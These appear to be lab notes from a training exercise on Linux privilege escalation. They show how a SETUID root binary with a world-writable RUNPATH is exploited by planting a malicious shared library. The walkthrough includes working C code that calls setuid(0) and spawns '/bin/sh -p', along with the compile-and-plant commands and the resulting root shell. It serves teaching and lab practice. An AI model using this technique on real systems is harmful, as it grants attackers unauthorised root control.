## Concept
Custom/dev-related SETUID binaries often link to **non-standard shared libraries**. If the library's search path is misconfigured (e.g. writable by any user), an attacker can plant a malicious library that gets loaded instead of the real one — executing arbitrary code with the binary's elevated privileges.

---

## Step 1 — Identify the target SETUID binary
```bash
ls -la payroll
```
```
-rwsr-xr-x 1 root root 16728 Sep  1 22:05 payroll
```
- `s` in the permissions = SETUID bit — runs with owner's (root's) privileges regardless of who executes it.

## Step 2 — Enumerate required shared libraries
```bash
ldd payroll
```
```
linux-vdso.so.1 =>  (0x00007ffcb3133000)
libshared.so => /development/libshared.so (0x00007f0c13112000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (...)
/lib64/ld-linux-x86-64.so.2 (...)
```
- `libshared.so` is a **non-standard library** loaded from a custom path (`/development`).

## Step 3 — Check the binary's RUNPATH
```bash
readelf -d payroll | grep PATH
```
```
0x000000000000001d (RUNPATH)  Library runpath: [/development]
```
- `RUNPATH` entries are checked **before** other library locations — libraries placed there take precedence.

## Step 4 — Check permissions on the RUNPATH directory
```bash
ls -la /development/
```
```
drwxrwxrwx  2 root root 4096 Sep  1 22:06 ./
```
- World-writable (`drwxrwxrwx`) → any user can drop files here, and they'll be loaded ahead of legitimate libraries.

---

## Exploitation

### Step 1 — Identify the missing/expected function
Copy a placeholder library in first to trigger a symbol lookup error, revealing the exact function name the binary expects:
```bash
cp /lib/x86_64-linux-gnu/libc.so.6 /development/libshared.so
./payroll
```
```
./payroll: symbol lookup error: ./payroll: undefined symbol: dbquery
```
- Confirms `/development/libshared.so` is indeed being loaded, and the binary calls a function named **`dbquery`**.

### Step 2 — Write a malicious library implementing that function
```c
#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>

void dbquery() {
    printf("Malicious library loaded\n");
    setuid(0);
    system("/bin/sh -p");
}
```

### Step 3 — Compile and place it at the hijacked path
```bash
gcc src.c -fPIC -shared -o /development/libshared.so
```

### Step 4 — Run the binary
```bash
./payroll
```
```
***************Inlane Freight Employee Database***************

Malicious library loaded
# id
uid=0(root) gid=1000(mrb3n) groups=1000(mrb3n)
```
→ Root shell obtained via the SETUID binary loading the malicious library.

---

## Key Takeaway
Chain: **SETUID binary** → `ldd` reveals a non-standard library dependency → `readelf -d <binary> | grep PATH` confirms a writable `RUNPATH` → drop a malicious `.so` implementing the binary's expected function(s) → executing the SETUID binary runs attacker code as root.